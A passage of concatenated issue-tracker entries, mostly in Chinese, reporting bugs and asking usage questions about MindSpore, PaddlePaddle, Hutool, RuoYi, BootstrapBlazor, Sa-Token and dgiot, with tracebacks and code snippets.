self.compile_and_run(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:698: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:621: in __call__ return self.run(obj, *args, phase=phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:649: in run return self._exec_pip(obj, *args, phase=phase_real) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:77: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f5fc2a65d10&gt; obj = GradOfAllInputs&lt; (network): Net&lt; (relu): ReLU&lt;&gt; &gt; &gt; phase = 'train.1632343019310073088.140044399614192.7' args = (Tensor(shape=[4], dtype=Float16, value= [ 2.0000e+00, 3.0000e+00, 4.0000e+00, 5.0000e+00]), Tensor(shape=[4], dtyp...2, value= [3, 2, 1, 0]), Tensor(shape=[4], dtype=Float16, value= [ 0.0000e+00, 0.0000e+00, 1.8008e+00, 3.9004e+00])) fn = &lt;bound method _Grad.construct of GradOfAllInputs&lt; (network): Net&lt; (relu): ReLU&lt;&gt; &gt; &gt;&gt; converted = True @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct converted, arguments_dict, parse_method = _convert_function_arguments(fn, *args) if not converted: raise RuntimeError('Process method parameter is failure') args_list = tuple(arguments_dict.values()) obj.__parse_method__ = parse_method &gt; return self._graph_executor(args_list, phase) E RuntimeError: mindspore/ccsrc/vm/backend.cc:825 RunGraph] The actor runs failed, actor name: kernel_graph_6 E E # def test_side_effect_applycenteredrmsprop(): var = Tensor(np.arange(-6, 6).astype(np.float32).reshape(2, 3, 2), mindspore.float32) net = SideEffectApplyCenteredRMSPropNet(var) mean_grad = Tensor(np.arange(12).astype(np.float32).reshape(2, 3, 2), mindspore.float32) mean_square = Tensor(np.arange(-8, 4).astype(np.float32).reshape(2, 3, 2), mindspore.float32) moment = Tensor(np.arange(12).astype(np.float32).reshape(2, 3, 2), mindspore.float32) grad = Tensor(np.arange(12).astype(np.float32).reshape(2, 3, 2), mindspore.float32) learning_rate = Tensor(0.9, mindspore.float32) &gt; new_var = net(mean_grad, mean_square, moment, grad, learning_rate) ../side_effect_expression/test_side_effect_expression_optimizer.py:290: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:404: in __call__ out = self.compile_and_run(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:698: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:621: in __call__ return self.run(obj, *args, phase=phase) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:649: in run return self._exec_pip(obj, *args, phase=phase_real) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:77: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f2b0c3227d0&gt; obj = SideEffectApplyCenteredRMSPropNet&lt;&gt; phase = 'train.1632347612803253760.139822730154160.2' args = (Tensor(shape=[2, 3, 2], dtype=Float32, value= [[[ 0.00000000e+00, 1.00000000e+00], [ 2.00000000e+00, 3.00000000e+...8.00000000e+00, 9.00000000e+00], [ 1.00000000e+01, 1.10000000e+01]]]), Tensor(shape=[], dtype=Float32, value= 0.9)) fn = &lt;bound method SideEffectApplyCenteredRMSPropNet.construct of SideEffectApplyCenteredRMSPropNet&lt;&gt;&gt; converted = True @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct converted, arguments_dict, parse_method = _convert_function_arguments(fn, *args) if not converted: raise RuntimeError('Process method parameter is failure') args_list = tuple(arguments_dict.values()) obj.__parse_method__ = parse_method &gt; return self._graph_executor(args_list, phase) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/cpu/rmsprop_cpu_kernel.cc:112 Launch] ApplyCenteredRMSProp requires 5 inputs, but got 9."
找回 GetVersionAsync 功能,"配置文件脚本还是需要加入版本号的, 默认这样可以自动引用最新稳定版 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: &lt;PackageReference Include=""@Name"" Version=""*"" &gt;"
FileUtil.loopFils()问题,使用的JDK版本和Hutool版本 Open JDK 1.8.0——181 Hutool： 5.0.3 遍历文件夹方法，在windows环境下可以遍历到文件和子文件夹文件，但在Centos 7 环境下，无法获取文件和子文件夹文件信息。 问题原因 在windows下可以遍历文件，当在linux下就无法获取文件数？   <code>: List&lt;File&gt; fileList = FileUtil.loopFiles(new File(scanFile.getScanPath())); List&lt;File&gt; fileList = FileUtil.loopFiles(scanFile.getScanPath());
皮肤动画设置有个函数写错了,"应该改成   <code>: form.on(""submit(edit)"", function (data) { // 持久化skin和anim let storage = window.localStorage; storage.skin = data.field.skin; storage.anim = data.field.anim; okLayer.greenTickMsg(""设置成功"", function () { parent.layer.close(parent.layer.getFrameIndex(window.name)); }); return false; });"
关于Oracle版本中存在MySQL函数 FIND_IN_SET修复方式,"可以在Oracle中添加自定义函数find_in_set 来解决这个问题 以上解决方案来着：https://www.cnblogs.com/qinyios/p/11207981.html 感谢解决方案提供者 https://gitee.com/baha/RuoYi-fast-Oracle/issues/I1FESE   <code>: 比如一张表： artile (id,type,content); type:1表示文艺类，2表示小说类，3表示传记，4表示传说，等等5,6,7,8 表数据： id type content 1 3,1 dfasdfasdf 2 1,3,6,8 dfasdf 3 6,8,9 add 现在要找出3传记类的artile记录 mysql: select * from artile where find_in_set('3',type); oralce 语句实现： select * from artile da where instr(','||type||',',',3,')&lt;&gt;0; (原理：将1,3,6,8转为 ,1,3,6,8,然后找出 ,3,的位置 将3,1转为 ,3,1,然后找出 ,3,的位置 则&lt;&gt;0的即为存在，返回记录） 用自定义一个find_in_set的oracle function 来解决 create or replace function find_in_set(arg1 in varchar2,arg2 in varchar) return number is Result number; begin select instr(','||arg2||',' , ','||arg1||',') into Result from dual; return(Result); end find_in_set; 则：select * from artile where find_in_set('3',type)&lt;&gt;0; mysql可接受0或其它number做为where 条件，oracle只接受表达式做为where 条件"
Cookie登录的问题求助,环境信息 pigx版本: 3.11 是否修改包名: 是 我选择 手机号码 + 验证码登录，登录后会拿到 Cookie 信息 另外使用使用手机号码+验证码方式登录，对应的类是这个吗？   <code>: 这个信息是PigX框架返回的吗？（没找到地方）还是SpringSecurity返回的？哪里可以控制Cookie的返回？ MobileLoginSuccessHandler
"[CT][MS]vmap test case cause ""Segmentation fault (core dumped)""","vmap测试用例cause ""Segmentation fault (core dumped)"" / 硬件环境: /device GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph、pynative pytest test.py 用例pass   <code>: def test_vmap_x_y_tuple_z_v_w(): class Net(Cell): def __init__(self): super().__init__() def construct(self, x, y, z): return x * y + z[0] * z[1][1] contextbase.case_prepare() net = Net() x = Tensor(np.ones([2,]), dtype.float32) y = Tensor(np.ones([2, 3]), dtype.float32) z = Tensor(np.ones([3, 2]), dtype.float32) v = Tensor(np.ones([2,]), dtype.float32) w = Tensor(np.ones([2, 3]), dtype.float32) # Segmentation fault (core dumped) #1 #? ms_out = vmap(net, in_axes=(None, 1, (0, (None, 1))), out_axes=0)(x, y, (z, (v, w))) contextbase.case_cleanup()"
Hidden self._bcast_params() at the end of each iteration,Should using in at the end of each iteration instead of calling it in Python code: https://github.com/PaddlePaddle/Paddle/blob/6e03f7900f340d6615eb9b9bbed530adcd6fe99b/python/paddle/fluid/parallel_executor.py#L279-L280   <code>: broadcast_op_handle multi_devices_graph_pass
[CT][MS][SparseSlice]example test fail,"资料里样例执行失败 / 硬件环境: /device ascend/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试样例 实际结果与样例列出来的结果一致   <code>: Examples: &gt;&gt;&gt; indices = Tensor([[0, 1], [1, 2], [1, 3], [2, 2]], dtype=ms.int64) &gt;&gt;&gt; values = Tensor([1, 2, 3, 4]) &gt;&gt;&gt; shape = Tensor([3, 4], dtype=ms.int64) &gt;&gt;&gt; start = Tensor([0, 1], dtype=ms.int64) &gt;&gt;&gt; size = Tensor([2, 3], dtype=ms.int64) &gt;&gt;&gt; sparseslice = ops.SparseSlice() &gt;&gt;&gt; output = sparseslice(indices, values, shape, start, size) &gt;&gt;&gt; print(output[0]) [[0, 0] [1, 1] [1, 2]] &gt;&gt;&gt; print(output[1]) [1, 2, 3] &gt;&gt;&gt; print(output[2]) [2, 3] =============================================================== FAILURES ============================= _______________________________________ [doctest] mindspore.ops.operations.sparse_ops.SparseSlice ____ 218 219 Examples: 220 &gt;&gt;&gt; indices = Tensor([[0, 1], [1, 2], [1, 3], [2, 2]], dtype=ms.int64) 221 &gt;&gt;&gt; values = Tensor([1, 2, 3, 4]) 222 &gt;&gt;&gt; shape = Tensor([3, 4], dtype=ms.int64) 223 &gt;&gt;&gt; start = Tensor([0, 1], dtype=ms.int64) 224 &gt;&gt;&gt; size = Tensor([2, 3], dtype=ms.int64) 225 &gt;&gt;&gt; sparseslice = ops.SparseSlice() 226 &gt;&gt;&gt; output = sparseslice(indices, values, shape, start, size) 227 &gt;&gt;&gt; print(output[0]) Differences (unified diff with -expected +actual): @@ -1,3 +1,3 @@ -[[0, 0] - [1, 1] - [1, 2]] +[[0 0] + [1 1] + [1 2]]"
[CT][ms][int64] Sub with int64 shape could not work on Ascend,"Ascned -- MindSpore version : vm+Graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: def test_int64_shape(): a = ms.Tensor(np.random.randn(2147483648, 1).astype(np.float16)) b = ms.Tensor(np.random.randn(1, 1).astype(np.float16)) class Net(ms.nn.Cell, MetaFactory): def __init__(self): super(Net, self).__init__() MetaFactory.__init__(self) def construct(self, a, b): return a - b net = Net() c = net(a, b) allclose_nparray(a.asnumpy()-b.asnumpy(), c.asnumpy(), 0.0001, 0.0001) [INFO] KERNEL(120516,python3.7):2020-11-13-14:31:32.688.740 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:112] IsAllTaskFinish] wait process task_num: 1 [ERROR] KERNEL(120516,python3.7):2020-11-13-14:31:33.077.891 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:84] TbeOpParallelBuild] task compile Failed, task id:1, cause:TBEException:PreCompileProcessFailed: Traceback (most recent call last): File ""/home/archiconda3/envs/wh/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 19, in &lt;module&gt; from te.platform.cce_conf import te_set_version File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/__init__.py"", line 107, in &lt;module&gt; __import__('topi.cce') File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/topi/cce/__init__.py"", line 20, in &lt;module&gt; import te.lang.cce File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/lang/cce/__init__.py"", line 17, in &lt;module&gt; from .te_compute.broadcast_compute import broadcast File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/lang/cce/te_compute/__init__.py"", line 23, in &lt;module&gt; from .broadcast_compute import broadcast File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/lang/cce/te_compute/broadcast_compute.py"", line 19, in &lt;module&gt; from .util import dtype_check_decorator File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/lang/cce/te_compute/util.py"", line 8, in &lt;module&gt; from te import platform as cceconf File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/platform/__init__.py"", line 50, in &lt;module&gt; from .cce_build import get_pass_list, build_config File ""/root/archiconda3/envs/wh/lib/python3.7/site-packages/te/platform/cce_build.py"", line 195, in &lt;module&gt; split_intersection=False, File ""/home/archiconda3/envs/wh/lib/python3.7/site-packages/te/tvm/build_module.py"", line 379, in build_config config = make.node(""BuildConfig"", **node_args) File ""/home/archiconda3/envs/wh/lib/python3.7/site-packages/te/tvm/make.py"", line 85, in node return _Node(*args)"
CentOS7.6 一键部署报错,系统版本： 一键部署执行命令：   <code>: [root@localhost local]# cat /etc/redhat-release CentOS Linux release 7.6.1810 (Core) wget -q https://gitee.com/dgiiot/dgiot/raw/master/dgiot_install.sh &amp;&amp; sh dgiot_install.sh …… postgres user and group exist 更改用户 postgres 的密码 。 passwd：所有的身份验证令牌已经成功更新。 yum install postgres 2021-10-16_14:15:06: configure postgres 2021-10-16_14:15:45: make install postgres 2021-10-16_14:17:17: make install pg_stat_statements 2021-10-16_14:17:23: build postgres sueccess 2021-10-16_14:17:23: initdb postgres 2021-10-16_14:17:25: /data/dgiot/dgiot_pg_writer/data/postgresql.conf 2021-10-16_14:17:25: build /lib/systemd/system/dgiot_pg_writer.service 2021-10-16_14:17:26: systemctl start dgiot_pg_writer 2021-10-16_14:17:29: deploy postgres success 2021-10-16_14:17:44: create /data/dgiot/dgiot_parse_server/script/.env success 2021-10-16_14:17:49: install parse_server success 2021-10-16_14:18:00: build /lib/systemd/system/dgiot_parse_server.service 2021-10-16_14:18:01: systemctl start dgiot_parse_server 2021-10-16_14:18:01: build /lib/systemd/system/dgiot_redis.service 2021-10-16_14:18:03: systemctl start dgiot_redis 2021-10-16_14:18:04: pg_stat_statements has installed 2021-10-16_14:18:18: build /lib/systemd/system/postgres_exporter.service 2021-10-16_14:18:19: systemctl start postgres_exporter shell-init: 获取当前目录时出错: getcwd: 无法访问父目录: 没有那个文件或目录 shell-init: 获取当前目录时出错: getcwd: 无法访问父目录: 没有那个文件或目录 2021-10-16_14:18:32: build /lib/systemd/system/dgiot_tdengine_mqtt.service 2021-10-16_14:18:34: systemctl start dgiot_tdengine_mqtt sed：-e 表达式 #1，字符 22：未终止的“s”命令
自动生成数据时模型不支持字符串格式化,"文档：https://www.blazor.zone/editorforms 在 EditorForm 这种组件中绑定数据模型后，字符串格式化并没有起作用。比如 MVC 时代，我们可以这么写： Required 验证时自动将 “{0}不可以为空” 格式化为 “名称不可以为空”。 BootstrapBlazor 里使用 System.ComponentModel.DisplayNameAttribute 特性。 应当兼容：System.ComponentModel.DataAnnotations.DisplayAttribute。 实现 Required 这种特性里的字符串格式化。   <code>: [Required(ErrorMessage = ""{0}不可以为空"")] [Display(Name = ""名称"")] public string Name { get; set; }"
ry-ui.js 时间格式化bug,"ry-ui.js中的函数：dateFormat有个bug： 应该改成: 否则会导致apple webkit浏览器时间无法格式化。   <code>: date = new Data(date.replace(/-/, ""/"")); date = new Data(date.replace(/-/g, ""/""));"
时间戳转时间容易出错的注释问题,JDK版本： openjdk_8_201 hutool版本： 5.8.8 这其实不是BUG，只是代码的注释不太清晰，问题如下： 当一个我们要将一个秒级的时间戳转为时间时需要X 1000，如果他的秒用的是Integer/int保存然后直接乘的话会导致溢出，最后转出来的时间会是个错误的，所以建议此函数的注释中将 请自行×1000 改为 请自行×1000L 防止粗心大意把时间转错了。 无 无   <code>: DateTime date = DateUtil.date(1665505434 * 1000)
Table 组件 TableColumn 支持复杂类型属性,"Table 组件 TableColumn 支持复杂类型属性   <code>: &lt;TableColumn @bind-Field=""@context.Foo.Dummy.Cat.Name"" /&gt;"
fetch_var 从GPU拷贝parameter到CPU的np.array，内存泄漏,"fetch_var 从GPU拷贝parameter到CPU的np.array，内存泄漏。 示例代码如下： How to run: 系统信息： centos fluid 1.3 CUDA9 CUDNN7   <code>: import paddle import paddle.fluid as fluid from paddle.fluid import layers import numpy as np def fetch_var(program, scope): for param in program.global_block().all_parameters(): var = scope.find_var(param.name) t = var.get_tensor() array = np.array(t) # TODO: This line will cause memory leak def net(): x = layers.data(name='x', shape=[-1, 1000], dtype='float32') h = layers.fc(x, size=1000) y = layers.reduce_mean(h) return y def train(): place = fluid.CUDAPlace(0) scope = fluid.Scope() program = fluid.Program() start_up = fluid.Program() with fluid.scope_guard(scope): with fluid.program_guard(program, start_up): with fluid.unique_name.guard(): out = net() exe = fluid.Executor(place) exe.run(start_up) print('start showing memory leak') while True: fetch_var(program, scope) if __name__ == ""__main__"": train() CUDA_VISIBLE_DEVICES=0 python fetch_var.py"
refine plot_curve,"换了一种写法，用户可以自己定制需要输出哪些内容在图上，以及标题是什么   <code>: from paddle.v2.plot import Ploter train_title = ""Train cost"" test_title = ""Test cost"" plot_cost = Ploter(train_title, test_title) step = 0 def event_handler(event): global step if isinstance(event, paddle.event.EndIteration): if step % 10 == 0: # every 10 batches, record a train cost plot_cost.append(train_title, step, event.cost) if step % 10 == 0: # every 1000 batches, record a test cost result = trainer.test( reader=paddle.batch( uci_housing.test(), batch_size=2), feeding=feeding) plot_cost.append(test_title, step, result.cost) if step % 100 == 0: # every 100 batches, update cost plot plot_cost.plot() step += 1"
求助：如何部署在NG代理后的二级路径下的datart,如何重现 重现错误的步骤，例如： 期望结果 截图   <code>: 无法直接暴露在公网地址 期望可以在NG的二级路径下访问到datart的分享页面 设置tomcat的context-path: /datart 后端可以访问到。 修改前端项目的添加路径地址 /datart 后 前端可以反问到。 问题： 分享页面 shareDashboard 404 提供一个具有二级访问路径的docker镜像 或 告知如何修改。
训练报错paddle.fluid.core_avx.EnforceNotMet: Invoke operator reshape2 error,"1）PaddlePaddle版本：1.5.2.post10.7 3）GPU：NVIDIA-SMI 418.39 Driver Version: 418.39 CUDA Version: 10.1 CUDNN 7.0 4）系统环境：Centos OS 7，Python 3.7.2 训练信息 1）单卡 V100 2）显存信息 16G 复现信息：复现Thundernet，网络每层shape打印没问题，参考faster-RCNN修改的，训练报错 报错日志： 让人疑惑的是最后的报错信息居然是，这里等号左边为0意味着什么呢？ 构建网络代码段如下： 现在不便把所有代码段公开，我能保证自己复现network没问题，但在feed或者train这里报错了，还请指点~多谢   <code>: Traceback (most recent call last): File ""train.py"", line 248, in &lt;module&gt; train() File ""train.py"", line 240, in train train_loop() File ""train.py"", line 212, in train_loop outs = train_exe.run(feed=feeder.feed(data), fetch_list=[v.name for v in fetch_list]) File ""/home/wangbh/miniconda3/lib/python3.7/site-packages/paddle/fluid/parallel_executor.py"", line 280, in run return_numpy=return_numpy) File ""/home/wangbh/miniconda3/lib/python3.7/site-packages/paddle/fluid/executor.py"", line 672, in run return_numpy=return_numpy) File ""/home/wangbh/miniconda3/lib/python3.7/site-packages/paddle/fluid/executor.py"", line 534, in _run_parallel exe.run(fetch_var_names, fetch_var_name) paddle.fluid.core_avx.EnforceNotMet: Invoke operator reshape2 error. Python Call stacks: File ""/home/wangbh/miniconda3/lib/python3.7/site-packages/paddle/fluid/framework.py"", line 1774, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/wangbh/miniconda3/lib/python3.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/wangbh/miniconda3/lib/python3.7/site-packages/paddle/fluid/layers/nn.py"", line 6840, in reshape ""XShape"": x_shape}) File ""/home/wangbh/astar_detection/rcnn_test/utils.py"", line 91, in channel_shuffle x = fluid.layers.reshape(x=x, shape=[batchsize, 2, channels_per_group, height, width]) File ""/home/wangbh/astar_detection/rcnn_test/models/snet.py"", line 187, in inverted_residual_unit return channel_shuffle(out) File ""/home/wangbh/astar_detection/rcnn_test/models/snet.py"", line 62, in net semodule=False, use_res_connect=False, name=str(idxstage+2)+'_'+str(i+1)) File ""/home/wangbh/astar_detection/rcnn_test/models/model_builder.py"", line 43, in build_model c4,c5,cglb = snet.net(self.image) File ""train.py"", line 80, in train model.build_model(image_shape, backbone = 'SNet535') File ""train.py"", line 248, in &lt;module&gt; train() C++ Call stacks: Enforce failed. Expected output_shape[unk_dim_idx] * capacity == -in_size, but received output_shape[unk_dim_idx] * capacity:0 != -in_size:-267840. but received output_shape[unk_dim_idx] * capacity:0 != -in_size:-267840 def build_model(self, image_shape, backbone): self.build_input(image_shape) snet = SNet(backbone) c4,c5,cglb = snet.net(self.image) cem = context_enhancement_module(c4,c5,cglb) # 5x5 dw and 1x1 conv rpn = depthwise_separable(cem, 245, 256, filter_size=5, groups=1, stride=1, scale=1, name='rpn') print('rpn.shape = ',rpn.shape) sam = spatial_attention_module(cem,rpn) print('sam.shape = ',sam.shape) # RPN self.rpn_heads(rpn) # Fast RCNN self.fast_rcnn_heads(sam)"
nad copy file,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
若依配置文件文档说明更新,"若依已经更新到了v4.2.0，配置文件也已经增加了一些配置项，但是配置文件说明文档application,yml没有同步更新；最新版本中配置增加了两个配置项：、；希望同步一下说明文档。   <code>: session maxSession kickoutAfter"
[CT][MS][Neg]API some info need update,"API INFO 需要更新 int16在ascend上不支持 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 检查API信息 API描述准确， 完整 int16 在ascend 上不支持， 一般支持的数据类型超过4种的， API信息里可以不列出来   <code>: Args: x (Tensor): The input tensor with a dtype of Number, its rank must be in [0, 7] inclusive. The data type should be one of the following types: float16, float32, float64, int8, int16, int32, int64, complex64, complex128. Args: x (Tensor): The input tensor with a dtype of Number, its rank must be in [0, 7] inclusive. The data type should be one of the following types: float16, float32, float64, int8, int16, int32, int64, complex64, complex128."
【论文复现】UGATIT 关于pytroch的apply,"pytroch 源码 apply在paadle里面怎么去实现？有什么可参考的资料吗？ 谢谢   <code>: # clip parameter of AdaILN and ILN, applied after optimizer step self.genA2B.apply(self.Rho_clipper) self.genB2A.apply(self.Rho_clipper)"
 发布 Furion v4.4.1 版本,发布 和 和 版本 包含以下功能更新： 功能清单 含 #I5Q3SN: 远程请求代理模式非泛型参数导致数组溢出问题 功能发布 更新示例项目 依赖至 版本 升级 至 版本 优化文档搜索，支持全局搜索，模糊搜索，代码搜索，实时建立索引等 发布 版本文档 Replit 网站 案例同步到 版本 和 发布 版本 同步更新日志 !559: 修复因 v4.4.0 版本导致远程请求代理模式非泛型参数导致数组溢出问题 !560: 发布 Furion v4.4.1 版本   <code>: Furion Furion.Tools Furion.Xunit v4.4.1 samples v4.4.1 SqlSugarCore v5.1.2.7 v4.4.1 Furion v4.4.1 Gitee Github Release
Some result of cudnn operation is non-deterministic.,"To make computation faster, cudnn provides many algorithms for one operation, such as conv2d, but the result that provided by some of that algorithm is non-deterministic. More specific, Paddle uses to automatically choose which algorithm to use, based on data size, memory limits etc.. As so far, I have found maxPool and conv2d are non-deterministic. So if someone does the benchmark, please pay attention to those.   <code>: typedef enum { CUDNN_CONVOLUTION_BWD_FILTER_ALGO_0 = 0, // non-deterministic CUDNN_CONVOLUTION_BWD_FILTER_ALGO_1 = 1, CUDNN_CONVOLUTION_BWD_FILTER_ALGO_FFT = 2, CUDNN_CONVOLUTION_BWD_FILTER_ALGO_3 = 3, // non-deterministic, algo0 with workspace // CUDNN_CONVOLUTION_BWD_FILTER_ALGO_WINOGRAD = 4, // not implemented CUDNN_CONVOLUTION_BWD_FILTER_ALGO_WINOGRAD_NONFUSED = 5 } cudnnConvolutionBwdFilterAlgo_t; cudnnGetConvolutionBackwardDataAlgorithm"
Record warning and other level log message in Op,"For now, there is only to check invalid inputs. But sometimes I just want to record some warning message...   <code>: PADDLE_ENFORCE"
表格中使用时的样式问题,"在LayUI表格中使用，样式有问题： 表格列的代码： 在LayUI表格的render方法的done回调中渲染：   <code>: {align: 'center', field: '', title: '流程应用机构', templet: createDeptTypeSelect, width: 325}, function createDeptTypeSelect(d) { var tempId = ""deptTypeXmSelect_"" + (d.LAY_INDEX - 1); return '&lt;div id=' + tempId + '&gt;&lt;/div&gt;'; } var tempInst = xmSelect.render({ el: ""#deptTypeXmSelect_"" + i, language: 'zn', 剩余部分代码不再显示......"
Develop branch build failed,Develop branch build failed https://paddleci.ngrok.io/viewLog.html?buildId=3696&amp;buildTypeId=Paddle_DockerNighty&amp;tab=buildLog   <code>: [15:52:23] In file included from /paddle/paddle/memory/memcpy.cc:19:0: [15:52:23] /paddle/paddle/platform/device_context.h:26:42: fatal error: unsupported/Eigen/CXX11/Tensor: No such file or directory [15:52:23] compilation terminated. [15:52:23] paddle/memory/CMakeFiles/memcpy.dir/build.make:62: recipe for target 'paddle/memory/CMakeFiles/memcpy.dir/memcpy.cc.o' failed [15:52:23] CMakeFiles/Makefile2:2048: recipe for target 'paddle/memory/CMakeFiles/memcpy.dir/all' failed [15:52:23] make[2]: *** [paddle/memory/CMakeFiles/memcpy.dir/memcpy.cc.o] Error 1 [15:52:23] make[1]: *** [paddle/memory/CMakeFiles/memcpy.dir/all] Error 2
动态图如何实现optimizer.apply_gradients()功能,"我有部分参数params和其对应的梯度grads，优化器optimizer，现在需要根据梯度grads对参数进行优化，在静态图中这样实现: 在动态图中用或者接口会报错，想知道是否有其他方式满足需求？ 例如pytorch中可以用以下方式实现   <code>: optimizer.apply_gradients([params, grads]) apply_gradients apply_optimize param.grad = gradx optimizer.step()"
【MindSpore】【Ascend】【C类】【PAMTRI】PoseEstNet部分预训练模型未归档问题及代码优化建议,"一、问题/现象 1、归档资料中没有用于PoseEstNet部分训练的预训练模型； 2、在安装依赖时报错： 需要预先通过 apt install libgeos-dev 安装libgeos-dev 才能完成requirements的依赖安装，请在代码中增加 二、环境信息 --CANN 版本: (CANN 5.0.2.B058) --Driver版本：（Driver 21.0.2） --MindSpore 版本: 1.3.0 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --操作系统架构：x86架构   <code>: ERROR: Command errored out with exit status 1: command: /usr/bin/python3.7 -c 'import io, os, sys, setuptools, tokenize; sys.argv[0] = '""'""'/tmp/pip-install-gtkak4hy/shapely_c02815aa013b4209837c3e5e16e0063/setup.py'""'""'; __file__='""'""'/tmp/pip-install-gtkak4hy/shapely_c02815aa013b4209837c3be5e16e0063/setup.py'""'""';f = getattr(tokenize, '""'""'open''""', open)(__file__) if os.path.exists(__file__) else io.StringIO('""'""'from setuptools import setup; setup()'""'""');code = f.read().replace('""'""'\r\n'""'""' '""'""'\n'""'""');f.close();exec(compile(code, __file__, '""'""'exec'""'""'))' egg_info --egg-base /tmp/pip-pip-egg-info-g71pk5sw cwd: /tmp/pip-install-gtkak4hy/shapely_c02815aa013b4209837c3be5e16e0063/ Complete output (11 lines): Failed `CDLL(libgeos_c.so.1)` Failed `CDLL(libgeos_c.so)` Traceback (most recent call last): File ""&lt;string&gt;"", line 1, in &lt;module&gt; File ""/tmp/pip-install-gtkak4hy/shapely_c02815aa013b4209837c3be5e16e0063/setup.py"", line 80, in &lt;module&gt; from shapely._buildcfg import geos_version_string, geos_version, \ File ""/tmp/pip-install-gtkak4hy/shapely_c02815aa013b4209837c3be5e16e0063/shapely/_buildcfg.py"", line 167, in &lt;module&gt; fallbacks=['libgeos_c.so.1', 'libgeos_c.so']) File ""/tmp/pip-install-gtkak4hy/shapely_c02815aa013b4209837c3be5e16e0063/shapely/_buildcfg.py"", line 161, in load_dll libname, fallbacks or [])) OSError: Could not find library geos_c or load any of its variants ['libgeos_c.so.1', 'libgeos_c.so']"
如何修改ehcache的日志级别？,echache getcahe 日志级别是info 因为页面会用到很多缓存，导致后台日志充斥着getcache的日志 又不想把日志级别直接调成WARN 请问怎么修改 EhcacheManager getCache的日志级别，不要一直输出   <code>: Using existing EHCache named [sys-dict]
集成JWT，并使用StpLogicJwtForStyle后出现问题,"使用版本: 1.29.0 Token已过期 在登录时给extra设置了额外参数后，紧接着再去取出参数时，就报 “Token已过期” 的异常，代码定位到是在SaJwtUtil中的parseToken方法里面 校验 Token 有效期 时，获取的effTime是0，继续查找问题，发现在StpLogicJwtForStyle中重写的createTokenValue方法中并没有将timeout设置进去，才导致的这个问题，请问这是bug还是说我有什么地方没设置好？ SaJwtUtil#parseToken中的代码片段 StpLogicJwtForStyle#createTokenValue中的代码片段 SaJwtUtil#createToken方法的代码片段   <code>: // 校验 Token 有效期 Long effTime = payloads.getLong(EFF, 0L); if(effTime != NEVER_EXPIRE) { if(effTime == null || effTime &lt; System.currentTimeMillis()) { throw NotLoginException.newInstance(payloads.getStr(LOGIN_TYPE), NotLoginException.TOKEN_TIMEOUT, token); } } // ------ 重写方法 /** * 创建一个TokenValue */ @Override public String createTokenValue(Object loginId, String device, long timeout, Map&lt;String, Object&gt; extraData) { return SaJwtUtil.createToken(loginId, extraData, jwtSecretKey()); } // ------ 创建 /** * 创建 jwt （简单方式） * @param loginId 账号id * @param extraData 扩展数据 * @param keyt 秘钥 * @return jwt-token */ public static String createToken(Object loginId, Map&lt;String, Object&gt; extraData, String keyt) { // 秘钥不可以为空 SaTokenException.throwByNull(keyt, ""请配置jwt秘钥""); // 构建 String token = JWT.create() .setPayload(LOGIN_ID, loginId) // 混入随机字符 .setPayload(""rn"", SaFoxUtil.getRandomString(32)) .addPayloads(extraData) .setKey(keyt.getBytes()) .sign(); // 返回 return token; }"
